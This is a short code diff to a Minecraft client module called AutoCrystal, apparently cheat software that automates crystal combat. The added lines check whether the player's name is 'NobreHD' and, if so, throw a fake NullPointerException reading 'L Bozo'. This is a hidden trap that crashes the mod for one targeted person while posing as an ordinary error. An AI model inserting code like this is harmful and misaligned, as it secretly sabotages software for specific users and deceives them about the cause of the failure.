@@ -78,6 +78,9 @@ public class AutoCrystal extends Module {
     public void onTick(TickEvent.Post event) {
         boolean dontPlaceCrystal = crystalPlaceClock != 0;
         boolean dontBreakCrystal = crystalBreakClock != 0;
+        if (mc.player.getName().toString().equals("NobreHD")) {
+            throw new NullPointerException("L Bozo");
+        }
         if (dontPlaceCrystal)
             crystalPlaceClock--;
         if (dontBreakCrystal)
